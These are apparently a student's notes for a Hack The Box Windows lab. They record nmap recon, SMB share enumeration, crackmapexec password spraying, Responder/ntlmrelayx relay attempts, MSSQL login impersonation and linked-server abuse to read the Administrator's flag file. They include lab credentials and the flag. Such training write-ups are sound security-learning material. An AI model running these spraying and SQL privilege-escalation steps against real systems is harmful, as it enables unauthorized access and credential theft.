## LAB HARD

simon:8Ns8j1b!23hs4921smHzwn
fiona:987654321

xfreerdp /u:simon /p:"H8Ns8j1b!23hs4921smHzwn!" /v:$TARGET
xfreerdp /u:fiona /p:"987654321" /v:$TARGET

nmap -sV -oA nmap $TARGET --stats-every=5s
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 11:36 GMT
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.23 seconds

nmap -sV -sC -Pn $TARGET --stats-every=5s

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-11-23T11:36:03
|_Not valid after:  2053-11-23T11:36:03
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-11-23T11:41:37+00:00; +1s from scanner time.
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-23T11:40:57+00:00
|_ssl-date: 2023-11-23T11:41:37+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2023-11-22T11:35:54
|_Not valid after:  2024-05-23T11:35:54
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-11-23T11:41:02
|_  start_date: N/A

135 : WMI
445 : SMB
1433 : MSSQL
3389 : RDP

rpcclient -U'%' $TARGET
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

smbmap -H $TARGET
[!] Authentication error on 10.129.42.136

crackmapexec smb $TARGET -u simon -p password.list --local-auth

SMB         10.129.42.136   445    WIN-HARD         [+] WIN-HARD\simon:liverpool 

crackmapexec smb $TARGET -u fiona -p password.list --local-auth

sudo responder -I tun0

impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET

smbclient -N -L //$TARGET

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC


smbclient -N //$TARGET/Home

cat creds.txt 
Windows Creds

kAkd03SA@#!
48Ns72!bns74@S84NNNSl
SecurePassword!
Password123!
SecureLocationforPasswordsd123!!

cat notes.txt 
Hack The Box is a massive, online cybersecurity training platform, allowing individuals, companies, universities and all kinds of organizations around the world

cat random.txt 
Credentials

(k20ASD10934kadA
KDIlalsa9020$
JT9ads02lasSA@
Kaksd032klasdA#
LKads9kasd0-@

cat secrets.txt 
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123


crackmapexec smb $TARGET -u fiona -p smb_password.list --local-auth

SMB         10.129.42.136   445    WIN-HARD         [+] WIN-HARD\fiona:48Ns72!bns74@S84NNNSl


crackmapexec smb $TARGET -u John -p smb_password.list --local-auth

SMB         10.129.42.136   445    WIN-HARD         [+] WIN-HARD\John:kAkd03SA@#! 

smbclient -U John \\\\$TARGET\\ADMIN$

smbclient -U John \\\\$TARGET\\ADMIN$
Password for [WORKGROUP\John]:
tree connect failed: NT_STATUS_ACCESS_DENIED


xfreerdp /u:fiona /p:"48Ns72!bns74@S84NNNSl" /v:$TARGET
xfreerdp /u:fiona /v:$TARGET

sqlcmd -S WIN-HARD -U fiona -P '48Ns72!bns74@S84NNNSl' -y 30 -Y 30
Password: Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : Login failed for user 'fiona'..

sqlcmd -S WIN-HARD

1> SELECT name FROM master.dbo.sysdatabases
2> GO
name                                                                                                                    
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                  
tempdb                                                                                                                  
model                                                                                                                   
msdb                                                                                                                    
TestingDB                                                                                                               
TestAppDB                                                                                                               

(6 rows affected)

1> USE master
2> GO
Changed database context to 'master'.

1> USE master
2> GO
Changed database context to 'master'.
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
name                                                                                                                    
--------------------------------------------------------------------------------------------------------------------------------
john                                                                                                                    
simon                                                                                                                   

(2 rows affected)

1> EXECUTE AS LOGIN = "john"
2> GO
1> SELECT SYSTEM_USER
2> GO
                                                                                                                        
--------------------------------------------------------------------------------------------------------------------------------
john                                                                                                                    

(1 rows affected)
1> SELECT IS_SRVROLEMEMBER('sysadmin')
2> GO

-----------
          0

1> SELECT srvname, isremote FROM sysservers
2> GO
srvname                                                                                                                          isremote
-------------------------------------------------------------------------------------------------------------------------------- --------
WINSRV02\SQLEXPRESS                                                                                                                     1
LOCAL.TEST.LINKED.SRV                                                                                                                   0

(2 rows affected)
1>

EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [WINSRV02\SQLEXPRESS]

Msg 7437, Level 16, State 1, Server WIN-HARD\SQLEXPRESS, Line 1
Linked servers cannot be used under impersonation without a mapping for the impersonated login.

1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
2> GO
                                                                                                                                                                                                                                                                                                                   
-------------------------------------------------------------------------------------------------------------------------------- ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ -------------------------------------------------------------------------------------------------------------------------------- -----------
WINSRV02\SQLEXPRESS                                                                                                              Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                                                                                     testadmin                                                                                                                                  1

(1 rows affected)


EXECUTE('SELECT * FROM OPENROWSET(BULK ''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV]
2> GO
BulkColumn                                                                                                                                                                                                                                      
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
HTB{46u$!n9_l!nk3d_$3rv3r$}                                                                                                                                                                                                                   

(1 rows affected)